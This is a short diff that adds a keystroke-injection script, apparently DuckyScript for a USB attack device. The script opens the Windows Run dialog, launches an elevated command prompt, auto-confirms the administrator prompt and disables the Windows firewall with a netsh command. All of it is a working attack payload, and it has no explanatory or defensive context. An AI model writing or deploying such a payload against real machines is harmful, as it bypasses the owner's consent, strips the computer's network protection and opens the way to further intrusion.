@@ -1,0 +1,11 @@
+DELAY 750
+GUI r
+DELAY 750
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2050
+ALT s
+DELAY 2050
+ENTER
+STRING netsh firewall set opmode disable
+ENTER
